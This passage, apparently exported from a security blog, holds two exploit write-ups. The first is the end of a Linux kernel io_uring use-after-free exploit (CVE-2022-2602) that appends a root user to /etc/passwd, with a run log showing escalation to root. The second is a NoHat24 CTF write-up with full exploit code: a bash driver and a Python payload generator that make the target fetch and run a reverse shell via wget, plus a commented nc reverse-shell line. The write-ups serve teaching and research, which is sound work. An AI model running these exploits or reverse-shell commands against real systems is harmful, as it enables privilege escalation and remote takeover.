st.st_size){\n\t\tstat(\"/etc/passwd\", \u0026st);\n\t\tsize = st.st_size;\n\t\tsleep(2);\n\t}\n\t/* .. */\n}\n```\n\n### Exploitation Walkthrough\nWe went a little bit inside the File Exploitation technique, now let's see how we abused it in order to write our exploit.\nWe have already seen how we can trigger the UAF in the \"Root Cause\" section, let's see in details how we developed the exploit.\n\n#### Setup\nFirst, setup the io_uring context to work with the [Submission Queue Polling](https://unixism.net/loti/tutorial/sq_poll.html) mechanism and register a dummy file using the `io_uring_register` syscall.\n\n#### Starting slow_write\nSince we want to replace the userfault technique in the published POC with another one, we choose to go with the Slow Write technique. As described before, we can pause a write operation abusing the file locking mechanism. Before letting io_uring write into the registered \"dummy file\", we want to \"slow write\" on that file (that means, write a lot of data that will take time and lock the file inode) in a way that the kernel thread responsible to perform the write operation in behalf of io_uring, will be waiting at the [inode_lock](https://elixir.bootlin.com/linux/v5.15.75/source/fs/ext4/file.c#L263) call. In order to perform this slow write operation, we have been inspired from [this CVE-2022-2588 exploit](https://github.com/Markakd/CVE-2022-2588/blob/master/exp_file_credential.c#L558) function.\nNow that the write operation is paused, is the perfect time to trigger the UAF !\n\n#### Free the registered file (trigger the UAF)\nIn order to trigger the UAF, we have to trigger the Unix Garbager Collector ([unix_gc](https://elixir.bootlin.com/linux/v5.15.74/source/net/unix/garbage.c#L205)) function in some way. That was not a big deal. First, because the POC already had a source line that did exactly that. Second, because every `unix_*` file operation calls it in its release function (example with [unix_stream_ops](https://elixir.bootlin.com/linux/v5.15.75/source/net/unix/af_unix.c#L744)): [unix_release](https://elixir.bootlin.com/linux/v5.15.75/source/net/unix/af_unix.c#L941) -\u003e [unix_release_sock](https://elixir.bootlin.com/linux/v5.15.75/source/net/unix/af_unix.c#L534) -\u003e [unix_gc call](https://elixir.bootlin.com/linux/v5.15.75/source/net/unix/af_unix.c#L606).\n\n```C\nclose(socket(AF_UNIX, SOCK_DGRAM, 0));\n```\n\nWith this simple one-line, `unix_gc` is triggered and our target file chunk should be freed!\n\n#### Replace the target chunk\nNow, we have a freed chunk that can be re-used from another file allocation (since we are in a dedicated cache), and our objective is to re-allocate it with something in our control, like a sensitive file that we can open (the `open` syscall will allocate a `struct file` allocation in the `filp` cache) and let us perform a privileged operation by writing into it. Obviously, we went for \"/etc/passwd\" :}\n\nAs we described in the \"DirtyCred: File Exploitation\" section, since file permissions are checked once, we can easily re-allocate a read-only file, resumes the kernel thread we paused in the \"Starting slow_write\" section, and the write operation will be performed in that read-only file!\n\n##### Make the re-allocation more reliable\nSince the `filp` cache can be pretty busy (a lot of file operations and socket related stuff are inside this cache), a massive spray can be performed after the `unix_gc` is triggered, but it can be not enough. A good approach could also be to create some \"holes\" before triggering the targeted chunk re-allocation (to increase the FREELIST, but without releasing entire slabs), so that the following \"massive spray\" of \"/etc/passwd\" files would be more reliable.\n\n#### Release the slow_write lock\nNow that we have replaced the victim chunk with a specific file, when the slow write operation finishes, the lock is released and the io_uring kernel thread acquires the lock and starts writing into our re-allocated file (\"/etc/passwd\"), also if it's allocated as read-only.\n\n#### Overwrite /etc/passwd\nFirst, in order to just append text into \"/etc/passwd\" and not overwrite it from scratch, our victim file (the one that we have used as the victim chunk in our Use-After-Free) has been opened with the `O_APPEND` flag, that append text at the end of the file.\nWhat can we write into it? We can write a simple user using the following format, that will not require the password into \"\"/etc/shadow\":\n```bash\n\u003cUSER\u003e:\u003cHASH\u003e:0:0:/root:/root:/bin/sh\n```\n\n#### POC || GTFO\nYou can find the full exploit here: https://github.com/kiks7/CVE-2022-2602-Kernel-Exploit.\n\n```bash\n/ $ uname -a\nLinux (none) 5.15.74 #20 SMP Sat Nov 19 14:01:51 CET 2022 x86_64 GNU/Linux\n/ $ cat /etc/passwd\nroot:x:0:0:root:/root:/bin/sh\nuser:x:1000:1000:kiks,,,:/home/user:/bin/sh\n/ $ id\nuid=1000(user) gid=1000 groups=1000\n/ $ /poc\n[P] P1\n[P] P2\n[*] Creating thread for slow write on /tmp/rwA\n[*] Sleeping while waiting that slow_write starts ..\n[*][T1] Starting slow write ..\n[*][T1] Slowing write...\n[P] P3/P4\n[P] P5\n[*] Triggering unix_gc and freeing the registered fd\n[*] unix_gc finished !\n[P] P6\n[*] Spraying target files ..\n[*] Wait that slow_write finishes ..\n[P] P7/P8/P9\n[+][T1] slow_write finished\n[+] Slow write finished .. closing io_uring fd\n[*] Waits that the io_uring thread continues the writev operation while the process is still alive\n[+] Everything done !\nPassword:\nuid=0(root) gid=0 groups=0\n[+] DONE\n/ $ cat /etc/passwd\nroot:x:0:0:root:/root:/bin/sh\nuser:x:1000:1000:kiks,,,:/home/user:/bin/sh\npwn:$6$pwn$5m1zBfEzD3xCg.wOtCtlKePwQL3Y5UiVAQBEAIv67Ir9JfZjmjO7XwzMzk0IcRoPjtWg.k2ytbimpKp1s/RB2/:0:0:/root:/root:/bin/sh\n/ $\n```\n\n## Extra: new KRWX feature\n[KRWX](https://github.com/kiks7/KRWX) is a tool I developed to deepen kernel internals and to assists kernel exploitation. Since in this case it was necessary to deal with a specific special cache (`filp`) and this feature wasn't implemented, I added it. Now it's possible to retrieve the address of a specific `kmem_cache` using `kmem_cache_get(char* name)`, like the following:\n```C\n#include \"lib/krwx.h\"\nint main(){\n\t/* .. */\n\tkmem_cache_get(\"filp\");\n\t/* .. */\n}\n```\n\nIt will return the kernel address of the cache that can be used to allocate objects into it using the already present user-land `kmem_cache_alloc()` (with some internal changes to accomodate the implementation). You can find the [full example here](https://github.com/kiks7/KRWX/blob/main/client/example/kmem_cache_get.c), but this is an extract:\n```C\n#include \"lib/krwx.h\"\nint main(){\n\t/* .. */\n\tfilp = kmem_cache_get(\"filp\");\n\tchunk = kmem_cache_alloc(filp, GFP_KERNEL);\n\tkmem_cache_free(filp, chunk);\n\t/* .. *\n}\n```\n\nIf you are interested, you can find the project on [github](https://github.com/kiks7/KRWX).\n\n## Conclusions\nThis is how we managed to exploit the CVE-2022-2602 using the inode locking technique. It was a really fun (and sometimes pain) adventure and it was a pleasure to have worked on it with Luca ([@LukeGix](https://exploiter.dev)). You can take a look at [his blog post](https://exploiter.dev/blog/2022/CVE-2022-2602.html) to see how it's possible to exploit the same vulnerability with userfaultd and FUSE techniques! \n\nStay tuned for more!\n\n## References\n- https://exploiter.dev/blog/2022/CVE-2022-2602.html\n- https://github.com/kiks7/CVE-2022-2602-Kernel-Exploit\n- https://github.com/kiks7/KRWX\n- https://googleprojectzero.blogspot.com/2022/08/the-quantum-state-of-linux-kernel.html\n- https://github.com/Markakd/CVE-2022-2588/\n- https://zplin.me/papers/DirtyCred.pdf\n- https://i.blackhat.com/USA-22/Thursday/US-22-Lin-Cautious-A-New-Exploitation-Method.pdf\n- https://blog.hacktivesecurity.com/index.php/2022/06/13/linux-kernel-exploit-development-1day-case-study/\n- https://exploiter.dev/blog/2022/FUSE-exploit.html\n- https://en.wikipedia.org/wiki/Lock_(computer_science)\n- https://seclists.org/oss-sec/2022/q4/57?utm_source=dlvr.it\u0026utm_medium=twitter\n- https://ruia-ruia.github.io/2022/08/05/CVE-2022-29582-io-uring/","lastmodified":"2025-04-14T13:32:05.60308601Z","tags":null},"/notes/Exploiting-a-Quarantine-UAF-Mitigation-on-a-Custom-Allocator-Challenge":{"title":"### Exploiting a Quarantine UAF Mitigation on a Custom Allocator Challenge","content":"\n## Introduction\nIn the [previous blog post](https://1day.dev/notes/A-Reverse-Engineering-Journey-Walkthrough) we have covered a walkthrough guide to solve the Reverse Engineering challenge written for the [NoHat24](https://www.nohat.it/) security conference. In this blog post, we are going to cover the binary exploitation challenge that involves a custom userland allocator that has been specifically developed for this challenge. Writing our own allocator, remotely inspired from the kernel SLUB allocator, was a really fun and educational experience. We have implemented an Use-After-Free quarantine mitigation to prevent its exploitation, was it good enough?\n\n## Introducing the Custom Allocator\nThe custom allocator source code was available through an HTTP web interface and can now be download directly from [here](https://github.com/hacktivesec/nohat24-blog-references/tree/main/pwn).\n\nThe two files `hmalloc.h` and `hmalloc.c` contains the whole implementation of the custom allocator that replaces the standard glibc malloc. The following diagram and structs describes the allocator design:\n\n![[Custom Allocator.drawio.svg]]\n\n```C\nstruct list_head{\n  struct list_head* next;\n  struct list_head* prev;\n};\n\nstruct bucket{\n  struct list_head  buckets;\n  /* Offset of the available alloc inside the bucket */\n  uint16_t  offset;\n  /* How many allocs are freed */\n  uint8_t   freelist_count;\n  uint8_t   freelist[MAX_ALLOCS];\n  void*     allocs[];\n};\n\n/* Single allocations just contain the size of the alloc as metadata */\nstruct alloc{\n  uint16_t size;\n  void*   user[];\n} __attribute__((packed));\n\n```\nThe target allocator, inspired from the kernel SLUB allocator, has a simple \"bucket\" concept. Each allocation size (from 16 to 1024) has its own memory region retrieved from `mmap` (through `__init_bucket`) and it is considered a `SMALL_BUCKET`, while larger buckets (`LARGE_BUCKETS`) are not handled from the allocator. A Bucket Master Control (`bucket_master_ctrl` global variable inside `hmalloc.c`) is used to store buckets' addresses using an offset that can be used to retrieve the requested bucket for the needed size. The size of the allocation is the offset minus the size of a pointer. For example, the bucket address for 32 bytes allocations is at offset 24 (32-8).\n\nWhen `malloc` is called the first time with a specific size, that is always rounded to the nearest power of two starting from 32 (e.g. 32, 64, 128, 256, 512, 1024), the bucket is allocated through `__init_bucket` and referred to as the `current_bucket`. The current bucket is the bucket from where we try to initially allocate from. It can be retrieved, once allocated, using `__get_bucket`. Each allocation, named `alloc` inside the source code, contains just the size of the allocation as metadata and `alloc-\u003euser` is the returned `malloc` pointer. When an `alloc` is allocated from a `bucket`, the `bucket-\u003eoffset` is incremented by one and used for the next allocations to return subsequent memory addresses (it is always multiplied with the allocation size). The offset does not just provides the capability to return new allocations but also marks and identifies freed allocations inside the bucket. A freelist is implemented to first return freed memory (to avoid fragmentation) with a LIFO mechanism. `bucket-\u003efreelist` is an array of freed `allocs` (based on their offsets) that can be accessed with the `bucket-\u003efreelist_count` that is incremented every time an `alloc` is freed and decremented when a freed allocation is returned back to the user. This \"dynamic\" array permits to handle the freelist pretty easily and is the first path to return an allocation from the `__malloc` logic. \n\nWhen the maximum number of allocations (`(PAGE_SIZE - sizeof(struct bucket)) / alloc_size`) is reached for a bucket, a new bucket is created (through new `mmap` memory) and linked through the `list_head` `next` and `prev` members.\n```C\nold_current_bucket-\u003ebuckets.next = (struct list_head*) \u0026current_bucket-\u003ebuckets.next;\ncurrent_bucket-\u003ebuckets.prev = (struct list_head*) \u0026old_current_bucket-\u003ebuckets.next;\n```\n\nThe linked list permits to have more buckets linked together for each allocation size. When the current bucket is full (e.g. it is not possible to re-allocate freed allocs neither new allocs) previous and next buckets are verified (traversing the linked list backwards and forwards) and an allocation is returned if one of them contains a freed alloc on its freelist. Also, if the found bucket contains more than a specific amount of freed elements (`FREELIST_REPLACE_BUCKET_THRESHOLD`) it is replaced as the current bucket from the `bucket_master_ctrl` (through `__update_master_ctrl_bucket`). \n\nWhen `free` is called with a pointer, the `alloc` struct is retrieved through `ptr - sizeof(struct alloc)` and the bucket obtained masking the pointer with `0xfff` (memory returned from `mmap` is always page aligned). In order to calculate its offset inside the bucket, the allocation size retrieved from the metadata of the `alloc` is used as a dividend to the allocation address minus `bucket-\u003eallocs` (e.g. the first alloc is 0, the second 1, the third 2 and so on). The `bucket-\u003efreelist[]` array is updated with the calculated offset and `bucket-\u003efreelist_count` incremented by one.\n### Freelist quarantine mitigation\nBefore leaving the `free` function, a global `freelist_quarantine_time` variable is set with the current time. When verifying the freelist of the current bucket, the function `__is_freelist_available` verify its availability. It is possible to return a freed alloc **only** if ten seconds (`FREELIST_QUARANTINE_WAIT`) are passed from the last freed element:\n```C\nbool __is_freelist_available(){\n#ifdef FREELIST_QUARANTINE\n  if((time(NULL) - freelist_quarantine_time) \u003c FREELIST_QUARANTINE_WAIT){\n    DEBUG_PRINT(\"[DEBUG] Freelist is quarantined\\n\");\n    return false;\n  }\n  return true;\n#endif\n  return true;\n}\n```\n\nThis mitigations is aimed to prevent the immediate re-use of freed allocations (Use-After-Free vulnerabilities).\n### Freelist quarantine Weakness\nHowever, the mitigation is not bullet proof, and this is the intended objective of the CTF. The freelist timer is only checked while searching for freed allocs inside the same bucket, but not when traversing. Suppose the following scenario:\n- Two buckets (`bucket_1` and `bucket_2`) are fully allocated (e.g. no available or freed allocations). `bucket_2` is the \"current\" one (the one registered in the Bucket Master Control).\n- An alloc is freed from `bucket_1`.\n- When `malloc` is called (with the same size of the two buckets) the freelist of `bucket_2` is not available while, with traversing, the just freed alloc from `bucket_1` is immediately available.\n\nThe described scenario can be useful to exploit an immediate UaF condition.\n## Main binary logic\nThe main binary logic (`main.c`) is pretty simple. It reads from stdin `4096` bytes and parses it line by line, searching for commands to execute inside a `switch` statement. Each line must begin with a valid command (`CMD_CREATE`, `CMD_ADD`, `CMD_DELETE`, `CMD_SELL`, `CMD_DROP`) and follows a command specific format. For example, the `CMD_CREATE` command allocates a `struct object` (using `malloc`) where `malloc` is also used to allocate `object-\u003ename` and `object-\u003edescription` using `strlen` with some size validation. At the end of the command, the three function pointers (`sell`, `add` and `drop`) are respectively set  with `function_sell`, `function_add` and `function_drop`, just like a primitive OOP language. \nThis is the mentioned struct:\n```C\nstruct object{\n  int   id;\n  int   price;\n  char* name;\n  char* description;\n  int   stock;\n  int   earnings;\n  void (*sell) (struct object* this);\n  void (*add) (struct object* this);\n  void (*drop) (struct object* this);\n};\n```\n\nAlso, when a new `object` is allocated, an array of object pointers (`objs`) is updated to store all of them. The array is later used for the vtable functions (`sell`, `add` and `drop`) and to delete an object based on its specified id.\n## The vulnerability (UAF)\nThe vulnerability is pretty straightforward: when an object is freed (through `CMD_FREE`), the `objs` array is not updated and the dangling pointer can be still accessed without further validations from another command (Use-After-Free) or itself (Double Free).\nHowever, there is just one big obstacle: the freelist quarantine mitigation does not permit an immediate Use-After-Free. In order to exploit the UAF, it is necessary to re-create an heap layout similar to the one described in \"Freelist quarantine Weakness\", where we can trigger the UAF against an allocation from a non current bucket.\n## Exploitation\n### Objective\nLet's first declare an objective. As simple as it sounds, we want to compromise the binary application (that is exposed through `socat`) and read the flag. We have a UAF primitive on a `struct object` that contains interesting members: dynamic strings (that we can use to overlap the freed allocation) and three function pointers. Function pointers, that behave like a vtable, seems like a really juicy target since they are allocated in the heap (inside the object structure) and can be triggered from multiple commands. Name and description members are really interesting allocations that can be used to replace the freed alloc due to their flexible size based on user input.\n\nAlso, since we have a single interaction with the program (we pass everything through stdin once) we cannot use read primitives or similar to leak ASLR. We can go for a bruteforce or a partial overwrite in order to don't mess too much with randomized pointers.\n\n### Heap shaping to bypass the quarantine\nWith a clearer path in mind, let's start to create the UAF state with python step by step:\n```python\nobjs = []\ncontent = \"\"\n# Objective:\n# Allocate 2 64 bytes buckets and make them full\n# 520 = sizeof(struct bucket)\n# 4096 - 520 = 3576 / 64 = 55\nfor n in range(0, 55 * 2):\n\tobj_id = pack(\"\u003ch\", int(n)).decode()\n\tobjs.append(obj_id)\n\t# print_stderr(\"[*] Creating object {}\".format(n))\n\t# Create\n\tcontent += \"\\x10\" # CMD_CREATE\n\tcontent += obj_id\n\tcontent += \"\\x16\\x00\"\n\tcontent += \"\\x41\" * 20 + \"\\x00\"\n\tcontent += \"\\x42\" * 4 + \"\\x00\"\n\tcontent += \"\\n\"\n```\n\nWe fulfill two buckets (`bucket_1` and `bucket_2`) with 110 allocations of `struct object`. The size of `struct object` is `58`, hence it goes into the bucket of 64 bytes allocations (we can call it `bucket_64`). The `bucket_64` can contains up to 55 allocations since the `PAGE_SIZE` memory region (4096) minus the size of the `struct bucket` metadata (520) and divided by its size (64), it's 55. \n\n```python\n# DELETE (Free)\ncontent += \"\\x12\"\ncontent += objs[0]\ncontent += \"\\n\"\n\n# DELETE (Free)\ncontent += \"\\x12\"\ncontent += objs[1]\ncontent += \"\\n\"\n```\n\nWe then proceed to free the first two allocations from `bucket_1`. We free two of them since the last one (due to the LIFO freelist order) will be replaced, using the `CMD_CREATE` command, with another `struct object` (`malloc(sizeof(struct object));`) and initialized with zeros (removing the possibility of a partial overwrite to bypass ASLR). The first freed allocation, instead, can be replaced with arbitrary user input due to the dynamic allocation through `strlen`. Due to this function, however, we are limited to its internal behaviors (e.g. it is not possible to have NULL bytes inside our payload).\n\n### Partial Overwrite\nWe can create, through `CMD_CREATE`, a fake object inside the `name` or the `description` string allocation, by making its size falling inside the `bucket_64`, in order to trigger the UAF against it. \nWe can perform a partial overwrite through the `memcpy` function (on the freed object) by replacing one or two bytes in order to not affect ASLR at all. `execute_system` is an interesting function that accepts a char pointer and pass it as a parameter to `system`, allowing the execution of arbitrary shell code. It can be a really interesting primitive due to a crucial thing: the `rdi` register (e.g. the first parameter) is the object itself (`this`) for function pointers. This means that, if we can redirect the execution to `execute_system`, we control entirely the first parameter that is the command to be executed! In order to see what we need to partially overwrite, we can execute `objdump` against the binary:\n```bash\n$ objdump -D -M intel main | grep '\u003cexecute_system\\|function_drop'\n0000000000001270 \u003cexecute_system\u003e:\n00000000000012c0 \u003cfunction_drop\u003e:\n```\n\nThe `function_drop` address is `00000000000012c0`, while `execute_system` is `0000000000001270`. If we overwrite the last byte of the `object-\u003edrop` pointer with `0x70` and we execute the `CMD_DROP` command later, we can trigger the execution of `system` with input in our control (the last allocated object itself):\n```python\n    # ID \u0026 price\n    fake_obj = \"AA;$({});#\".format(cmd)\n    #fake_obj += \"\\x41\" * 0x2c\n    fake_obj += \"\\x41\" * ( 0x30 - len(fake_obj) )\n    # CMD_DROP function pointer =\u003e @execute_system\n    # @execute_system\n    fake_obj += \"\\x70\" + \"\\x00\"\n\n    # Create =\u003e alloc bucket1-\u003efreelist[1]\n    content += \"\\x10\"\n    content += \"\\x37\\x13\"  # sh\n    content += \"\\x16\\x00\"\n    # Name: system payload\n    content += \"BB\\x00\"\n    # Description: alloc on bucket1-\u003efreelist[0] (obj[0])\n    content += fake_obj\n    content += \"\\n\"\n\n    # CMD_DROP =\u003e Trigger arbitrary function call\n    content += \"\\x14\"\n    content += \"\\x41\\x41\"\n    content += \"\\n\"\n```\n\nSince the `struct object` allocation is limited in size for a direct reverse shell, the vulnerability is exploited three times to first upload a complete reverse shell through `wget`, `chmod` and finally execute it.\n\n## Alternative Solution (Double Free)\nAn alternative, originally not the intended solution, can be to exploit the Double Free vulnerability instead. It is possible to return the same `alloc` twice by inserting (through exploitation) the same freelist offset inside the `bucket-\u003efreelist` and achieve the same objective. If you have solved the challenge in that way at the NoHat CTF or in a different moment, we are really curious about that, let us know!\n\n## Conclusion\nThe final exploit can be found [here](https://github.com/hacktivesec/nohat24-blog-references/tree/main/pwn/exploit). Hope you have enjoyed this two article series on our CTF write-ups for the NoHat24 CTF event.\n\n## Appendix\n### Exploit Code\n`exploit.sh`\n\n```python\n#!/bin/bash\n\nif [ \"$#\" -ne 4 ]; then\n    echo \"$0 \u003cRHOST\u003e \u003cRPORT\u003e \u003cLHOST\u003e \u003cLPORT\u003e\"\n    exit\nfi\n\nRHOST=$1\nRPORT=$2\nLHOST=$3\nLPORT=$4\n\necho \"[*] Generating payload for the three stages\"\npython3 generate_input_files.py $LHOST\n\necho \"[*] Modifying script reverse shell to $LHOST:$LPORT\"\nsed -e \"s/LHOST/$LHOST/g\" -e \"s/LPORT/$LPORT/g\" rev.sh \u003e e\npython3 generate_input_files.py $LHOST\n\necho \"[*] Starting web browser\"\npython3 -m http.server\u0026\nsleep 1\n\necho \"[*] Sending stage 1 to  $RHOST $PORT - wget http://$LHOST:8000/e\"\nnc -v $RHOST $RPORT \u003c input_file_1\necho \"[+] Done\"\nsleep 1\n\necho \"[*] Sending stage 2 to  $RHOST $PORT\"\nnc -v $RHOST $RPORT \u003c input_file_2\necho \"[+] Done\"\nsleep 1\n\necho \"[*] Sending stage 3 to  $RHOST $PORT.. The uploaded script should be executed\"\nnc -v $RHOST $RPORT \u003c input_file_3\necho \"[+] Done\"\nsleep 1\n\n# kill web server\npkill python3\n```\n\n`generate_input_files.py`:\n```python\nfrom struct import pack\nimport sys\n\ndef print_stderr(msg):\n    sys.stderr.write(msg + \"\\n\")\n\ndef exploit(cmd, filename):\n    objs = []\n    content = \"\"\n    # Objective:\n    # Allocate 2 64 bytes buckets and make them full\n    # 520 = sizeof(struct bucket)\n    # 4096 - 520 = 3576 / 64 = 55\n    for n in range(0, 55 * 2):\n        obj_id = pack(\"\u003ch\", int(n)).decode()\n        objs.append(obj_id)\n        # print_stderr(\"[*] Creating object {}\".format(n))\n        # Create\n        content += \"\\x10\"\n        content += obj_id\n        content += \"\\x16\\x00\"\n        content += \"\\x41\" * 20 + \"\\x00\"\n        content += \"\\x42\" * 4 + \"\\x00\"\n        content += \"\\n\"\n\n    # Status\n    # Bucket 1: Fully allocated\n    # Bucket 2: Fully allocated (current)\n\n    # Free two allocations from bucket 1\n    # Since bucket 2 is current and the traversing doesn't involve the \n    # quarantine mitigation, we can bypass it\n\n    # DELETE (Free)\n    content += \"\\x12\"\n    content += objs[0]\n    content += \"\\n\"\n\n    # DELETE (Free)\n    content += \"\\x12\"\n    content += objs[1]\n    content += \"\\n\"\n\n    # ID \u0026 price\n    fake_obj = \"AA;$({});#\".format(cmd)\n    #fake_obj += \"\\x41\" * 0x2c\n    fake_obj += \"\\x41\" * ( 0x30 - len(fake_obj) )\n    # CMD_DROP function pointer\n    # @execute_system\n    fake_obj += \"\\x70\" + \"\\x00\"\n\n    # Create =\u003e alloc bucket1-\u003efreelist[1]\n    content += \"\\x10\"\n    content += \"\\x37\\x13\"  # sh\n    content += \"\\x16\\x00\"\n    # Name: system payload\n    # content += \";mknod /tmp/mypipe p ; /bin/bash 0\u003c /tmp/mypipe | nc 127.0.0.1 4445 1\u003e /tmp/mypipe\\x00\"\n    content += \"BB\\x00\"\n    # Description: alloc on bucket1-\u003efreelist[0] (| obj[0])\n    content += fake_obj\n    content += \"\\n\"\n\n    # DROP =\u003e Trigger arbitrary function call\n    content += \"\\x14\"\n    content += \"\\x41\\x41\"\n    content += \"\\n\"\n\n    with open(filename, \"w\") as f:\n        f.write(content)\n    print_stderr(\"[+] {} generated\".format(filename))\n\nif __name__ == \"__main__\":\n    exploit(\"wget http://{}:8000/e -O /tmp/e\".format(sys.argv[1]), \"input_file_1\")\n    exploit(\"chmod +x /tmp/e\", \"input_file_2\")\n    exploit(\"/tmp/e\", \"input_file_3\")\n```\n\n## Challenge Source Code\n`main.c`\n```C\n#include \u003cstdio.h\u003e\n#include \"hmalloc.h\"\n\n#define CMD_CREATE  0x10\n#define CMD_ADD     0x11\n#define CMD_DELETE  0x12\n#define CMD_SELL    0x13\n#define CMD_DROP    0x14\n\n#define MAX_OBJS      1000\n#define BUF_SZ        4096\n#define MAX_STRING_SZ 1024\n\nint total_earnings  = 0;\nint total_stocks    = 0;\nint total_objs      = 0;\nstruct object* objs[MAX_OBJS];\n\nstruct object{\n  int   id;\n  int   price;\n  char* name;\n  char* description;\n  int   stock;\n  int   earnings;\n  void (*sell) (struct object* this);\n  void (*add) (struct object* this);\n  void (*drop) (struct object* this);\n};\n\nvoid function_sell(struct object* this){\n  printf(\"CMD_SELL\\n\");\n  if(this-\u003estock \u003c= 0)\n    return;\n  this-\u003estock--;\n  this-\u003eearnings = this-\u003eearnings + this-\u003eprice;\n}\n\nvoid function_add(struct object* this){\n  printf(\"CMD_ADD\\n\");\n  this-\u003estock++;\n}\nvoid execute_system(const char* cmd){\n  system(cmd);\n}\n\nvoid notify_end(){\n  const char* cmd = \"touch /tmp/end\";\n  execute_system(cmd);\n}\n\nvoid function_drop(struct object* this){\n  printf(\"CMD_DROP\\n\");\n  this-\u003estock--;\n}\n\nvoid show_object(struct object* obj){\n    printf(\"\\tid: 0x%x\\n\", obj-\u003eid);\n    printf(\"\\tPrice: %d\\n\", obj-\u003eprice);\n    printf(\"\\tName: %s\\n\", obj-\u003ename);\n    printf(\"\\tDescription: %s\\n\", obj-\u003edescription);\n    printf(\"\\tStock: %d\\n\", obj-\u003estock);\n    printf(\"\\tEarnings: %d\\n\", obj-\u003eearnings);\n}\n\nstruct object* get_object(short int obj_id){\n    // Search for the product id\n    int j = 0;\n    while(j \u003c total_objs){\n      if((short int) objs[j]-\u003eid == obj_id)\n        return objs[j];\n      j++;\n    }\n    return NULL;\n}\n\nint main(){\n  char raw_input[BUF_SZ];\n  int n_read;\n  size_t n;\n  struct object* obj;\n  int obj_id;\n  memset(raw_input, 0x0, BUF_SZ);\n\n  /* Parse file from input */\n  n_read = read(0, raw_input, BUF_SZ);\n  int idx = 0;\n  while(idx \u003c n_read){\n    int command = raw_input[idx];\n    idx++;\n    switch(command){\n      case CMD_CREATE:\n        printf(\"CMD_CREATE\\n\");\n        obj = malloc(sizeof(struct object));\n        memset(obj, 0x0, sizeof(struct object));\n        /* Object ID*/\n        memcpy(\u0026obj-\u003eid, raw_input + idx, 2);\n        idx = idx + 2;\n\n        /* Object Price*/\n        memcpy(\u0026obj-\u003eprice, raw_input + idx, 2);\n        idx = idx + 2;\n\n        /* Object name */\n        n = strlen((char*) raw_input + idx);\n        if(n == 0 || n \u003e MAX_STRING_SZ || (idx + n) \u003e n_read)\n          return -1;\n        obj-\u003ename = malloc(n);\n        memcpy(obj-\u003ename, raw_input + idx, n);\n        idx = idx + n + 1;\n\n        /* Object description */\n        n = strlen((char*) raw_input + idx);\n        if(n == 0 || n \u003e MAX_STRING_SZ || (idx + n) \u003e n_read)\n          return -1;\n        obj-\u003edescription = malloc(n);\n        memcpy(obj-\u003edescription, raw_input + idx, n);\n        idx = idx + n + 1;\n\n        obj-\u003esell = function_sell;\n        obj-\u003eadd  = function_add;\n        obj-\u003edrop = function_drop;\n\n        if(total_objs \u003e MAX_OBJS)\n          return -1;\n\n        objs[total_objs] = obj;\n        total_objs++;\n        break;\n    case CMD_DROP:\n    case CMD_ADD:\n    case CMD_SELL:\n        memcpy(\u0026obj_id, raw_input + idx, 2);\n        idx = idx + 2;\n        obj = get_object(obj_id);\n        if(obj == NULL)\n          break;\n\n        if(command == CMD_ADD)\n          obj-\u003eadd(obj);\n        else if(command == CMD_DROP)\n          obj-\u003edrop(obj);\n        else if(command == CMD_SELL)\n          obj-\u003esell(obj);\n        break;\n  case CMD_DELETE:\n        printf(\"CMD_DELETE\\n\");\n        memcpy(\u0026obj_id, raw_input + idx, 2);\n        idx = idx + 2;\n        obj = get_object(obj_id);\n        if(obj == NULL)\n          break;\n\n        free(obj-\u003ename);\n        free(obj-\u003edescription);\n        free(obj);\n        break;\n      default:\n        fprintf(stdout, \"Command 0x%x not found\\n\", command);\n        return -1;\n        break;\n    }\n    if(raw_input[idx] != 0x0a){\n      fprintf(stderr, \"Missing newline\");\n      exit(EXIT_FAILURE);\n    }\n    idx++;\n  }\n  notify_end();\n  return 0;\n}\n```\n\n`hmalloc.h`\n```C\n#ifndef HMALLOC_H\n#define HMALLOC_H\n#include \u003cstdint.h\u003e\n#include \u003csys/types.h\u003e\n#include \u003cstring.h\u003e\n#include \u003cstdlib.h\u003e\n#include \u003cstdio.h\u003e\n#include \u003csys/mman.h\u003e\n#include \u003ctime.h\u003e\n#include \u003cunistd.h\u003e\n\n\n//#define DEBUG\n#ifdef DEBUG\n#define DEBUG_PRINT(fmt, args...)    fprintf(stderr, fmt, ## args)\n#else\n#define DEBUG_PRINT(fmt, args...)\n#endif\n\n#define PAGE_SZ         4096\n#define MAX_ALLOCS      500\n\n/* \n * Small buckets: 16, 32, 64, 128, 256, 512, 1024\n * Large buckets (not YET supported) : \u003e= 2048\n */\n\n#define SMALL_BUCKET_PAGES    1\n#define SMALL_BUCKET_MIN_SZ   16\n#define SMALL_BUCKET_MAX_SZ   1024\n#define SMALL_BUCKET_MASK     ~0xFFF // 1 PAGE\n\n#define LARGE_BUCKET_MIN_SZ   2048\n#define LARGE_BUCKET_PAGES    4             \n//#define LARGE_BUCKET_MASK     0xFFFFFFFFC000 // 4 PAGES\n//#define LARGE_BUCKET_MASK     TODO\n\n#define FREELIST_REPLACE_BUCKET_THRESHOLD   3\n\n/* 10 seconds */\n#define FREELIST_QUARANTINE\n#define FREELIST_QUARANTINE_WAIT            10\n\n\n#define BUCKET_MAX_SZ   2048\n\ntypedef uint64_t bool;\n#define true 1\n#define false 0\n\nstruct list_head{\n  struct list_head* next;\n  struct list_head* prev;\n};\n\nstruct bucket{\n  struct list_head  buckets;\n  /* Offset of the available alloc inside the bucket */\n  uint16_t  offset;\n  /* How many allocs are freed */\n  uint8_t   freelist_count;\n  uint8_t   freelist[MAX_ALLOCS];\n  void*     allocs[];\n};\n\n/* Single allocations just contain the size of the alloc as metadata */\nstruct alloc{\n  uint16_t size;\n  void*   user[];\n} __attribute__((packed));\n\nvoid* malloc(size_t size);\nvoid free(void* ptr);\nbool __hmalloc_init();\nvoid* __malloc(size_t size);\nsize_t __round_up_size(size_t sz);\nsize_t __bucket_max_allocations(size_t alloc_size);\nstruct bucket* __get_bucket(size_t alloc_size);\nstruct bucket* __get_bucket_from_alloc(struct alloc* target_alloc);\nstatic inline void __update_master_ctrl_bucket(size_t alloc_size, struct bucket* b);\nvoid* __fastpath_new_bucket_alloc(struct bucket* bucket, size_t alloc_size);\nbool __is_freelist_available();\nvoid __dump_bucket(struct bucket* b);\nvoid __dump_alloc(struct alloc* a);\n\n#endif // HMALLOC_H\n\n```\n\n`hmalloc.c`\n```C\n#include \"hmalloc.h\"\n/* \n * TODO: Single buckets are never unmmaped\n */\n\nvoid** bucket_master_ctrl = NULL;\ntime_t freelist_quarantine_time = 0;\n\nsize_t __round_up_size(size_t size) {\n  int power = 32;\n  while(power \u003c size)\n    power*=2;\n  return power;\n}\n\nvoid __dump_bucket(struct bucket* b){\n  